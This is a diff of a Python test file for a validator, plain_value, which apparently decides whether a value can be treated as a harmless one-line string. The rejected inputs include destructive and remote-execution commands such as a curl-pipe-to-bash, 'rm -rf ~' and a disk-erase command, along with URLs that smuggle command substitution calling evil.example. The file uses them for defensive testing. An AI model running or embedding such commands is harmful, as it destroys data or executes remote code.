@@ -286,11 +286,12 @@ def test_after_outside_text_a_link_still_goes_on_the_clipboard_but_a_command_wai
 
 def test_a_plain_value_is_one_line_that_runs_nothing():
     for value in (REPO, "https://www.google.com/search?q=milo&hl=de", "anna@example.com", "+49 151 2345 6789",
-                  "Hauptstraße 5, 10115 Berlin", "1Z999AA10123456784", "WIFI-guest-2026"):
+                  "1Z999AA10123456784", "WIFI-guest-2026"):
         assert plain_value(value), value
     for command in ("curl -fsSL https://x.sh | bash", "rm -rf ~", "sudo shutdown -h now", "echo $(whoami)",
                     "osascript -e 'tell app \"Finder\" to quit'", "open https://evil.example", "line one\nline two",
                     "python3 -c 'import os'", "a; b", "https://x.example/$(curl evil.example|sh)",
                     "https://x.example/`id`", "https://x.example/{rm,-rf,~}", "rm -rf /, 5", "Anna Schmidt",
-                    "diskutil eraseDisk JHFS+ X disk2", "killall Finder"):
+                    "diskutil eraseDisk JHFS+ X disk2", "killall Finder", "'rm' '-rf' '~', 5",
+                    "Hauptstraße 5, 10115 Berlin", "https://x.example/?a=1&reboot", "https://x.example/'a'"):
         assert not plain_value(command), command
